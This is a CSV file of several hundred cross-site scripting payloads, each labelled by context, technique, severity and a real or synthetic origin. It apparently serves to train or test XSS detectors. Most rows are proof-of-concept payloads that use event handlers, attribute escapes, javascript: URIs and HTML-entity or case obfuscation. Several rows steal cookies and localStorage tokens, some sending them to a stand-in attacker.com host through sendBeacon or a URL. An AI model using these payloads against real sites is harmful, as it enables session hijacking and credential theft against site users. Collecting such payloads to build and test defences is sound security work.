payload,context,technique,severity,length,source
"<svg onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</svg>",tag_injection,none,medium,68,real
" oninput=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,55,synthetic
"""><script onk&#101;ydown=confirm(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,59,synthetic
&quot; ondr&#97;g&#101;nt&#101;r=prompt(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape,synthetic,medium,74,synthetic
"<center onmousedown=""alert(1)"">AnonKryptiQuz</center>",tag_injection,none,medium,53,real
	onPagEshOw=AleRt('XSS'),event_handler,synthetic,medium,24,synthetic
"<a2 draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</a2>",tag_injection,none,medium,77,real
"<q oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,94,real
"<var draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</var>",tag_injection,none,medium,84,real
"""%3E%3Cimg src=x onpromptaction=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,73,synthetic
"""><div onp&#97;us&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,71,synthetic
%22><img src=x onpointerrawupdate=alert(location.hash)>,attribute_escape,synthetic,medium,55,synthetic
<xmp/ontransitionend=\u0061lert(location.hash)>,tag_injection,synthetic,low,47,synthetic
	onmousewheel=console.log(%27XSS%27),event_handler,synthetic,medium,36,synthetic
"\"" OntOucHstArt=prOmpT(dOcuMenT.dOmaIn)//",attribute_escape,synthetic,medium,41,synthetic
' ><svG oNpaGesHow=coNfiRm(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,44,synthetic
"<div draggable=""true"" contenteditable>drag me</div><nextid ondragover=alert(1) contenteditable style=display:block>drop here</nextid>",tag_injection,none,medium,133,real
document.write(%22<img src=x onerror=fetch(document.cookie+%27&loc=%27+location.href)>%22),dom_sink,synthetic,high,90,synthetic
 onsecuritypolicyviolation=console.log(document.domain),event_handler,synthetic,medium,55,synthetic
<marquee/onpopstate=\u0061lert('XSS')>,tag_injection,synthetic,low,38,synthetic
""" ><svg oninput=\u0061lert(document.domain)>",attribute_escape,synthetic,low,44,synthetic
"<address draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</address>",tag_injection,none,medium,87,real
<img language=vbs src=<b onerror=confirm#1/1#>,tag_injection,none,low,46,real
 onfocusout=alert('XSS'),event_handler,synthetic,medium,24,synthetic
\%27 onpromptdismiss=prompt(1)//,attribute_escape,synthetic,medium,32,synthetic
"(new Function(%22XMLHttpRequest(String.fromCharCode(88,83,83))%22))();",dom_sink,synthetic,high,70,synthetic
"""><animatetransform oncontextmenu=prompt(document.domain)>",tag_injection,synthetic,medium,58,synthetic
"location=""javascr	ipt:XMLHttpRequest(localStorage.getItem('token'))""",dom_sink,synthetic,high,68,synthetic
"<img2 onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</img2>",tag_injection,none,medium,69,real
"<style>@keyframes x{}</style><basefont style=""animation-name:x"" onanimationstart=""alert(1)""></basefont>",tag_injection,none,medium,103,real
""" %3E%3Csvg ondblclick=console.log('XSS')%3E",attribute_escape,synthetic,medium,44,synthetic
'%3E%3Cimg src=x oninput=confirm(1)%3E,attribute_escape,synthetic,medium,38,synthetic
\%27 onmousewheel=prompt(%27XSS%27)//,attribute_escape,synthetic,medium,37,synthetic
"eval(""fetch(btoa(document.cookie))"")",dom_sink,synthetic,high,36,synthetic
<object id=x tabindex=1 onactivate=alert(1)></object>,tag_injection,none,medium,53,real
"eval(""\u0061lert(document.cookie)"")",dom_sink,synthetic,high,35,synthetic
"javascr	ipt:prompt/*x*/(String.fromCharCode(88,83,83))",js_uri,synthetic,high,54,synthetic
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",script_injection,case_variation,medium,77,real
<&#97;nim&#97;t&#101;motion/ong&#101;stur&#101;st&#97;rt=confirm(1)>,tag_injection,synthetic,medium,68,synthetic
\%22 onscrollsnapchange=console.log(1)//,attribute_escape,synthetic,medium,40,synthetic
<<SCRIPT>alert(1)//<</SCRIPT>,script_injection,case_variation,medium,29,real
'%3E%3Cimg src=x ontouchmove=prompt('XSS')%3E,attribute_escape,synthetic,medium,45,synthetic
%3Cmtext x=y onfocusout=confirm(location.hash)%3E,tag_injection,synthetic,medium,49,synthetic
%3Ctemplate src=x onreset=alert(location.hash)%3E,tag_injection,synthetic,medium,49,synthetic
""" onkeypress=\u0061lert(1) """,attribute_escape,synthetic,low,28,synthetic
""" %3E%3Csvg onsearch=alert(1)%3E",attribute_escape,synthetic,medium,32,synthetic
"setInterval(%22prompt(document.domain)%22,100)",dom_sink,synthetic,high,46,synthetic
"__proto__[""onw&#97;iting""]=prompt(docum&#101;nt.cooki&#101;)",dom_sink,synthetic,medium,60,synthetic
<m&#97;rqu&#101;&#101; on&#97;uxclick=confirm(loc&#97;tion.h&#97;sh) on&#97;uxclick=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,115,synthetic
<script>/x/confirm('XSS')</script>,script_injection,synthetic,medium,34,synthetic
<command onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,69,real
""" onmous&#101;ov&#101;r=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,58,synthetic
"""><img src=x onvolum&#101;ch&#97;ng&#101;=confirm('XSS')>",attribute_escape,synthetic,medium,57,synthetic
&quot; oninput=console.log(document.domain) x=&quot;,attribute_escape,synthetic,medium,52,synthetic
<audio2 onpointerdown=alert(1) style=display:block>AnonKryptiQuz</audio2>,tag_injection,none,medium,73,real
' ><svg onbeforepaste=\u0061lert(1)>,attribute_escape,synthetic,low,36,synthetic
<td onst&#97;ll&#101;d=confirm('XSS')>,tag_injection,synthetic,medium,38,synthetic
"<fieldset onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</fieldset>",tag_injection,none,medium,92,real
"""><img src=x oninvalid=confirm(1)>",attribute_escape,synthetic,medium,34,synthetic
__proto__[%22onwebkittransitionend%22]=confirm(localStorage.getItem(%27token%27)),dom_sink,synthetic,high,81,synthetic
"<bdi draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</bdi>",tag_injection,none,medium,64,real
<hr id=x tabindex=1 onfocus=alert(1)></hr>,tag_injection,none,medium,42,real
<object id=x tabindex=1 onbeforeactivate=alert(1)></object>,tag_injection,none,medium,59,real
"\"" oninput=confirm(1)//",attribute_escape,synthetic,medium,23,synthetic
"<style>:target {color:red;}</style><tbody id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></tbody>",tag_injection,none,medium,114,real
location=%22javascript:eval(localStorage.getItem(%27token%27))%22,dom_sink,synthetic,high,65,synthetic
OncLosE=cOnsOle.loG/*X*/('XSS'),event_handler,synthetic,low,31,synthetic
'><Img srC=x onTouCheNd=ProMpt('XSS')>,attribute_escape,synthetic,medium,38,synthetic
<center id=x tabindex=1 onfocusin=alert(1)></center>,tag_injection,none,medium,52,real
%3C!--%3E%3Canimatetransform onpointermove=console.log('XSS')%3E,tag_injection,synthetic,medium,64,synthetic
"\"" ondrop=&#97;l&#101;rt('XSS')//",attribute_escape,synthetic,low,33,synthetic
""" ><svg ongesturestart=alert(location.hash)>",attribute_escape,synthetic,medium,44,synthetic
"%3Cscript
ondblclick=prompt(1)%3E",tag_injection,synthetic,medium,33,synthetic
<iframe/%00/ src=javaSCRIPT&colon;alert(1411),generic,url_encoding,medium,45,real
<!--><animate onfocus=console.log(document.domain)>,tag_injection,synthetic,medium,51,synthetic
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=eVal(doCumEnt.coOkiE)>"")",dom_sink,synthetic,high,59,synthetic
<form id=x tabindex=1 ondeactivate=alert(1)></form><input id=y autofocus>,tag_injection,none,medium,73,real
" onwebkittransitionend=\u0061lert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,64,synthetic
' oNpaUse=coNsoLe.Log(doCumEnt.doMaiN) ',attribute_escape,synthetic,medium,40,synthetic
"""><img src=x oncopy=console.log(1)>",attribute_escape,synthetic,medium,35,synthetic
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,tag_injection,unicode_escape|html_entity,low,76,real
"' oNreSet=alErt(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape,synthetic,high,48,synthetic
<svg onb&#101;for&#101;copy=prompt(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,medium,62,synthetic
"DatA:tExt/htMl,<scRipT>aLerT(STriNg.FroMChArCOde(88,83,83))</scRipT>",js_uri,synthetic,high,68,synthetic
'><img src=x onended=alert(1)>,attribute_escape,synthetic,medium,30,synthetic
<noscript onpointerdown=prompt(document.domain)/>,tag_injection,synthetic,medium,49,synthetic
javascript:void(console.log(location.hash)),js_uri,synthetic,medium,43,synthetic
"""><img src=x onfocusout=consol&#101;.log(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,low,64,synthetic
	onScrOllEnd=coNsoLe.Log(loCatIon.haSh),event_handler,synthetic,medium,39,synthetic
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""AnonKryptiQuz"")>",generic,case_variation,medium,61,real
"__proto__[""onplay""]=console.log(document.domain)",dom_sink,synthetic,medium,48,synthetic
"location=""javascript:XMLHttpRequest('XSS')""",dom_sink,synthetic,high,43,synthetic
"<video onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</video>",tag_injection,none,medium,72,real
"__proto__[""onpl&#97;ying""]=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",dom_sink,synthetic,medium,74,synthetic
"SetIntErvAl(""feTch(StRinG.fRomChaRCoDe(88,83,83))"",100)",dom_sink,synthetic,high,55,synthetic
'><img src=x onvolumechange=\u0061lert('XSS')>,attribute_escape,synthetic,low,46,synthetic
&quot; ong&#101;stur&#101;&#101;nd=&#97;l&#101;rt(1) x=&quot;,attribute_escape,synthetic,low,61,synthetic
""" onb&#101;for&#101;p&#97;st&#101;=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,70,synthetic
onbeforepaste=javascript:console.log(document.domain),event_handler,synthetic,medium,53,synthetic
http://www.google<script .com>alert(document.location)</script,dom_sink,none,medium,62,real
%27 onpagereveal=confirm(document.domain) %27,attribute_escape,synthetic,medium,45,synthetic
<obJecT oNanImaTioNcaNceL=aLerT(dOcuMenT.dOmaIn)/>,tag_injection,synthetic,medium,50,synthetic
\%22 onbeforepaste=alert(%27XSS%27)//,attribute_escape,synthetic,medium,37,synthetic
%3Canimatemotion ondblclick=console.log(1)/%3E,tag_injection,synthetic,medium,46,synthetic
"`><img src=x onanimationstart=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,72,synthetic
#prompt(%27XSS%27),template_injection,synthetic,medium,18,synthetic
{{constructor['constructor']('\u0061lert(document.domain)')()}},template_injection,synthetic,low,63,synthetic
"""><img src=x onchange=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
onwebkitfullscreenchange=prompt(document.domain),event_handler,synthetic,medium,48,synthetic
<obJecT oNbeForEpaSte=coNfiRm(DocUmeNt.DomAin)/>,tag_injection,synthetic,medium,48,synthetic
<liStiNg	OnkEyuP=aLerT(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,38,synthetic
location.href=%22javascript:confirm(%27XSS%27)%22,dom_sink,synthetic,high,49,synthetic
<!--><object onbeforepaste=confirm(document.domain)>,tag_injection,synthetic,medium,52,synthetic
"%27 ><svg onerror=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,55,synthetic
"element.setAttribute(""onclick"",""eval('XSS')"")",dom_sink,synthetic,low,45,synthetic
' %3E%3Csvg onpause=confirm(document.domain)%3E,attribute_escape,synthetic,medium,47,synthetic
%22 onpaste=confirm(%27XSS%27) %22,attribute_escape,synthetic,medium,34,synthetic
 onwebkitfullscreenchange=prompt(1),event_handler,synthetic,medium,35,synthetic
<script>/*/prompt(document.domain)</script>,script_injection,synthetic,medium,43,synthetic
<address onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
%3Cselect onvolumechange=console.log(1)%3E,tag_injection,synthetic,medium,42,synthetic
"SetTimEouT(""AleRt(BtoA(dOcuMenT.cOokIe))"",0)",dom_sink,synthetic,high,44,synthetic
JavA	sCriPt:ConFirM(dOcuMenT.dOmaIn),js_uri,synthetic,medium,36,synthetic
"""'><img src='#\x27 onerror=javascript:alert(9690)>",js_uri,none,medium,50,real
<acronym onpointerenter=alert(1) style=display:block>AnonKryptiQuz</acronym>,tag_injection,none,medium,76,real
'><img src=x onpagehide=alert(location.hash)>,attribute_escape,synthetic,medium,45,synthetic
"<script>setTimeout(%27prompt(String.fromCharCode(88,83,83))%27,0)</script>",script_injection,synthetic,high,74,synthetic
""" onmousewheel=alert(document.domain) """,attribute_escape,synthetic,medium,39,synthetic
&quot; ontouchend=console.log(1) x=&quot;,attribute_escape,synthetic,medium,41,synthetic
<audio x=y onpause=console.log(document.domain)>,tag_injection,synthetic,medium,48,synthetic
"<strike onmouseout=""alert(1)"">AnonKryptiQuz</strike>",tag_injection,none,medium,52,real
<image2 onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</image2><input value=clickme>,tag_injection,none,medium,103,real
"<style>@keyframes slidein {}</style><i style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></i>",tag_injection,none,medium,162,real
OnsCroLlsNapChaNge=alErt/*x*/(1),event_handler,synthetic,low,32,synthetic
"' onpromptaction=confirm(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,57,synthetic
"<noembed draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</noembed>",tag_injection,none,medium,72,real
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:XMLHttpR&#101;qu&#101;st(docum&#101;nt.dom&#97;in)""",dom_sink,synthetic,high,94,synthetic
<menuitem id=x tabindex=1 onfocusin=alert(1)></menuitem>,tag_injection,none,medium,56,real
	onload=\u0061lert(document.domain),event_handler,synthetic,low,35,synthetic
	onhashchange=alert(location.hash),event_handler,synthetic,medium,34,synthetic
"<thead onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</thead>",tag_injection,none,medium,63,real
"Obj&#101;ct.&#97;ssign(window,{""onh&#97;shch&#97;ng&#101;"":XMLHttpR&#101;qu&#101;st})",dom_sink,synthetic,high,85,synthetic
"<style>@keyframes x{}</style><i style=""animation-name:x"" onanimationend=""alert(1)""></i>",tag_injection,none,medium,87,real
"<template	onbegin=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,60,synthetic
'><Img srC=x onScrOllEnd=prOmpT(lOcaTioN.hAsh)>,attribute_escape,synthetic,medium,47,synthetic
'><img src=x onerror=console.log(document.domain)>,attribute_escape,synthetic,medium,50,synthetic
\%22 onblur=alert(document.domain)//,attribute_escape,synthetic,medium,36,synthetic
javascript:\\\\\\\\\\\\\\\/\\\\\\\\\\\\\\\/%250Aalert(1),js_uri,url_encoding,medium,56,real
"JavAscRipT:/*-/*`/*\`/*'/*""/**/(/* */oNCliCk=ProMpt(loCatIon.haSh) )//%0D%0A%0D%0A",js_uri,synthetic,medium,82,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onst&#97;ll&#101;d"":&#97;l&#101;rt})",dom_sink,synthetic,low,68,synthetic
 onPagEhiDe=ProMpt(doCumEnt.doMaiN),event_handler,synthetic,medium,35,synthetic
"<style>@keyframes slidein {}</style><multicol style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></multicol>",tag_injection,none,medium,176,real
"<style>:target {transform: rotate(180deg);}</style><blockquote id=x style=""transition:transform 2s"" ontransitionrun=print()></blockquote>",tag_injection,none,low,137,real
""" onfocus=console.log(String.fromCharCode(88,83,83)) autofocus=""",attribute_escape,synthetic,high,64,synthetic
"`><img src=x onbegin=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
"""><img src=x onfocus=alert(1)>",attribute_escape,synthetic,medium,30,synthetic
 onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,90,synthetic
"<form onmousedown=""alert(1)"">AnonKryptiQuz</form>",tag_injection,none,medium,49,real
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=&#101;v&#97;l(docum&#101;nt.dom&#97;in)>""",dom_sink,synthetic,low,100,synthetic
"<listing onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</listing>",tag_injection,none,medium,70,real
"<meta oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</meta>",tag_injection,none,medium,60,real
"<vid&#101;o onp&#97;st&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,low,85,synthetic
location=%22javascript:prompt(document.cookie)%22,dom_sink,synthetic,high,49,synthetic
"""><scr	ipt onpointerrawupdate=console.log(document.domain)>",tag_injection,synthetic,medium,59,synthetic
%3Cmtext onstalled=console.log(document.domain)%3E,tag_injection,synthetic,medium,50,synthetic
"""><Img srC=x onPasTe=ConFirM(STriNg.FroMChArCOde(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
<script onpointerrawupdate=console.log(document.domain)>,tag_injection,synthetic,medium,56,synthetic
"__pRotO__[""oNpoIntEruP""]=coNsoLe.Log(doCumEnt.coOkiE)",dom_sink,synthetic,high,53,synthetic
"${{'coNfiRm(1)'.rePlaCe('coNfiRm(1)','')}}",template_injection,synthetic,medium,42,synthetic
"s&#101;tInt&#101;rv&#97;l(""prompt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))"",100)",dom_sink,synthetic,medium,140,synthetic
"<kbd draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</kbd>",tag_injection,none,medium,59,real
"<a href=""  &#x8; &#23;   javascript:alert('Successful AnonKryptiQuz')"">Click this link!</a>",js_uri,html_entity,medium,91,real
%3Cembed onmozfullscreenchange=confirm(location.hash) onmozfullscreenchange=confirm(location.hash)%3E,tag_injection,synthetic,medium,101,synthetic
"%3Cnoscript
onpointerdown=prompt(document.domain)%3E",tag_injection,synthetic,medium,52,synthetic
"\' onpopstate=confirm(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,54,synthetic
"\"" onblur=alert(location.hash)//",attribute_escape,synthetic,medium,32,synthetic
' ><svg onwebkitanimationend=console.log(document.domain)>,attribute_escape,synthetic,medium,58,synthetic
"""><img src=x onmous&#101;wh&#101;&#101;l=prompt('XSS')>",attribute_escape,synthetic,medium,55,synthetic
"""^prompt(9)^""",attribute_escape,none,medium,13,real
<animatetransform onpointermove=console.log('XSS')/>,tag_injection,synthetic,medium,52,synthetic
<link/onwaiting=confirm(1)>,tag_injection,synthetic,medium,27,synthetic
' ><svg onpause=console.log(document.domain)>,attribute_escape,synthetic,medium,45,synthetic
<element onblur=alert(1) tabindex=1 id=x></element><input autofocus>,tag_injection,none,medium,68,real
"\"" OntOucHstArt=coNsoLe.Log(1)//",attribute_escape,synthetic,medium,32,synthetic
""" onpopstate=alert('XSS') """,attribute_escape,synthetic,medium,27,synthetic
&quot; onfocusout=confirm(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape,synthetic,medium,57,synthetic
"<boDy/OnfOcuSouT=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,55,synthetic
	onTraNsiTioNstArt=coNfiRm(LocAtiOn.HasH),event_handler,synthetic,medium,41,synthetic
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""XMLHtTpREquEst(doCumEnt.coOkiE+'&loC='+loCatIon.hrEf)""",dom_sink,synthetic,high,97,synthetic
<select onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</select>,tag_injection,none,medium,78,real
'><img src=x ons&#101;l&#101;ct=prompt(1)>,attribute_escape,synthetic,medium,42,synthetic
"<script>/x/\u0061lert(String.fromCharCode(88,83,83))</script>",script_injection,synthetic,high,61,synthetic
	onKeyDowN=aLerT('XSS'),event_handler,synthetic,medium,23,synthetic
<set/onwebkitfullscreenchange=console.log('XSS')>,tag_injection,synthetic,medium,49,synthetic
"<soUrcE	oNvoLumEchAngE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,62,synthetic
"__proto__[""ongestureend""]=alert(String.fromCharCode(88,83,83))",dom_sink,synthetic,high,62,synthetic
"java
script:prompt(%27XSS%27)",js_uri,synthetic,medium,29,synthetic
"<a2 onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</a2>",tag_injection,none,medium,65,real
"\"" onfocusin=console.log(location.hash)//",attribute_escape,synthetic,medium,41,synthetic
"<div id=""29""><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//[""'`-->]]>]</div><div id=""30""><style>@import ""data:,*%7bx:expression(alert(30))%7D"";</style>//[""'`-->]]>]</div><div id=""31""><frameset onload=alert(31)>//[""'`-->]]>]</div><div id=""32""><table background=""javascript:alert(32)""></table>//[""'`-->]]>]</div><div id=""33""><a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""alert(33);"">XXX</a></a><a href=""javascript:alert(2)"">XXX</a>//[""'`-->]]>]</div><div id=""34"">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=AnonKryptiQuz.vml#xss></vmlframe>//[""'`-->]]>]</div><div id=""35"">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//[""'`-->]]>]</div><div id=""36""><a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:alert(36)"">XXX</a>//[""'`-->]]>]</div><div id=""37""><!--<img src=""--><img src=x onerror=alert(37)//"">//[""'`-->]]>]</div><div id=""38""><comment><img src=""</comment><img src=x onerror=alert(38)//"">//[""'`-->]]>]</div>",js_uri,comment_injection|url_encoding,medium,1210,real
"__proto__[""ondblclick""]=prompt('//attacker.com/?c='+document.cookie)",dom_sink,synthetic,high,68,synthetic
"' ><svg onanimationend=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,62,synthetic
%3Ctemplate onsearch=console.log(document.domain)/%3E,tag_injection,synthetic,medium,53,synthetic
<element onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</element><input value=clickme>,tag_injection,none,medium,114,real
<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>,tag_injection,none,medium,60,real
%3Cplaintext onpagereveal=alert(location.hash) onpagereveal=alert(location.hash)%3E,tag_injection,synthetic,medium,83,synthetic
search?q=javascript:alert(document.domain),dom_sink,none,medium,42,real
'><img src=x onpagehide=\u0061lert(document.domain)>,attribute_escape,synthetic,low,52,synthetic
"\"" onlo&#97;d=consol&#101;.log(1)//",attribute_escape,synthetic,low,35,synthetic
"element.setAttribute(""onclick"",""console.log(document.cookie)"")",dom_sink,synthetic,high,62,synthetic
"<style>:target {color:red;}</style><rb id=x style=""transition:color 1s"" ontransitionend=alert(1)></rb>",tag_injection,none,medium,102,real
"setInterval(""eval(localStorage.getItem('token'))"",100)",dom_sink,synthetic,high,54,synthetic
"<body onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</body>",tag_injection,none,medium,66,real
'><scr	ipt>confirm(document.domain)</scr	ipt>,script_injection,synthetic,medium,45,synthetic
javascr	ipt:alert/***/(document.domain),js_uri,synthetic,low,39,synthetic
'><img src=x onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt('XSS')>,attribute_escape,synthetic,low,64,synthetic
"""><script>consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection,synthetic,low,75,synthetic
"<span oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</span>",tag_injection,none,medium,71,real
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=cOnsOle.loG('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)>""",dom_sink,synthetic,high,95,synthetic
`><img src=x ondrop=confirm(document.domain)>,attribute_escape,synthetic,medium,45,synthetic
<body x=y onclose=console.log(%27XSS%27)>,tag_injection,synthetic,medium,41,synthetic
%27><img src=x onanimationend=confirm(document.domain)>,attribute_escape,synthetic,medium,55,synthetic
"<keygen onmouseleave=""alert(1)"">AnonKryptiQuz</keygen>",tag_injection,none,medium,54,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=consol&#101;.log(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>"")",dom_sink,synthetic,low,127,synthetic
 onanimationend=console.log(location.hash),event_handler,synthetic,medium,42,synthetic
JavA	sCriPt:ProMpt('XSS'),js_uri,synthetic,medium,25,synthetic
"\"" onanimationend=console.log('XSS')//",attribute_escape,synthetic,medium,38,synthetic
"<maRquEe
OnbEfoRetOggLe=AleRt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,61,synthetic
' oNtoUchMovE=pRomPt('XSS') ',attribute_escape,synthetic,medium,29,synthetic
oncut=javascript:alert(1),event_handler,synthetic,medium,25,synthetic
%3Ctemplate onclose=console.log(1)%3E,tag_injection,synthetic,medium,37,synthetic
"element.setAttribute(%22onclick%22,%22confirm(document.cookie+%27&loc=%27+location.href)%22)",dom_sink,synthetic,high,92,synthetic
"""><script>consol&#101;.log('XSS')</script>",script_injection,synthetic,low,42,synthetic
"<plaintext onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</plaintext>",tag_injection,none,medium,71,real
"%3Cscript
onkeydown=confirm(document.domain)%3E",tag_injection,synthetic,medium,47,synthetic
%3Cbutton x=y onclick=console.log(1)%3E,tag_injection,synthetic,medium,39,synthetic
onw&#101;bkit&#97;nim&#97;tion&#101;nd=confirm/*x*/(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,77,synthetic
<table onselect=confirm(document.domain)>,tag_injection,synthetic,medium,41,synthetic
"?alert(1)"",",generic,none,medium,11,real
%3Ctable onselect=confirm(document.domain)%3E,tag_injection,synthetic,medium,45,synthetic
"<style>@keyframes slidein {}</style><button style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></button>",tag_injection,none,medium,172,real
onk&#101;ydown=consol&#101;.log/**/(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,61,synthetic
"%3C!--%3E%3Cp onbeforetoggle=alert(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,68,synthetic
<!--><TemPlaTe OncLosE=cOnsOle.loG(1)>,tag_injection,synthetic,medium,38,synthetic
<script	>console.log('XSS')</script>,script_injection,synthetic,medium,36,synthetic
"javascr	ipt:%0aalert(String.fromCharCode(88,83,83))",js_uri,synthetic,high,51,synthetic
"<track onmouseenter=""alert(1)"">AnonKryptiQuz</track>",tag_injection,none,medium,52,real
'%3E%3Cimg src=x onsecuritypolicyviolation=prompt(1)%3E,attribute_escape,synthetic,medium,55,synthetic
"<figure draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",tag_injection,none,medium,90,real
""" %3E%3Csvg ondragenter=confirm('XSS')%3E",attribute_escape,synthetic,medium,41,synthetic
